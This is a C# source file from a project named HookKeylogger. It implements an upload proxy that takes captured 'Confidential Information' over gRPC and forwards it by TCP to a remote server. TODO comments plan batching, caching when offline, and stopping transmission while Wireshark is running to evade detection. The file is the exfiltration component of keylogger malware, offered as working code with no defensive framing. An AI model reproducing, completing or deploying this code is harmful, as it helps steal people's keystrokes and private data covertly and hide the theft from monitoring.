using System.Threading.Tasks;
using Grpc.Core;
using rpc = HookKeylogger.UploadProxy.Rpc;
using System;
using HookKeylogger.Base;
using Google.Protobuf;
using System.Net.Sockets;

namespace HookKeylogger.UploadProxy.Rpc
{
    /// <summary>
    /// Implementation of the ServerProxy RPC listener library.
    /// TODO(rssguar@gmail.com): Make this process durable.
    /// TODO(rssguar@gmail.com): Cache/Batch messages to server.
    /// TODO(rssguar@gmail.com): Cache messages if server is not reachable.
    /// TODO(rssguar@gmail.com): Prevent the sending of messages when WireShark is running.
    /// </summary>
    public class UploadProxyImpl : rpc.UploadProxy.IUploadProxy
    {
        StreamExtension s;
        string a;
        Int32 p;
        public UploadProxyImpl(string addr, Int32 port)
        {
            a = addr;
            p = port;
            this.Connect(a, p);
        }

        private void Connect(string addr, Int32 port)
        {
            TcpClient c = new TcpClient(addr, port);
            this.s = new StreamExtension(c.GetStream());

        }

        /// <summary>
        /// Process incoming SendRequests and immediately forward the Confidential Information to the server.
        /// </summary>
        /// <param name="request">The Send Request object.</param>
        /// <param name="context">The RPC Request context.</param>
        /// <returns>A send response.</returns>
        public Task<rpc.SendResponse> SendCi(rpc.SendRequest request, ServerCallContext context)
        {
            Console.WriteLine("Received Send Request" + request.Ci.Data);
            if (s.IsConnected())
            {
                request.Ci.WriteDelimitedTo(s);
            } else
            {
                Console.WriteLine("s is not connected reconnecting");
                this.Connect(a, p);
            }
            var resp = new SendResponse();
            resp.Status = SendResponse.Types.Status.OK;
            return Task.FromResult(resp);
        }
    }
}
